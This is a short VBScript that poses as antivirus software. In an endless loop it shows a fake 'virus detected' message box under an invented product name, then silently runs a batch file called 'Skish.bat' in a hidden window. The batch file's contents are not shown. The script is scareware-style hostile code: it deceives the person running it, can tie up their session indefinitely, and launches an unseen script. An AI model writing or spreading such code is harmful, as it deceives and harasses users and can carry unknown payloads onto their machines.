DO
x=msgbox("We have detected a virus on your computer would you like us to delete it?",0+48,"Skish AntiVirus Software Protector 1.34.5")
CreateObject("WScript.Shell").RUN "Skish.bat", 0, True
LOOP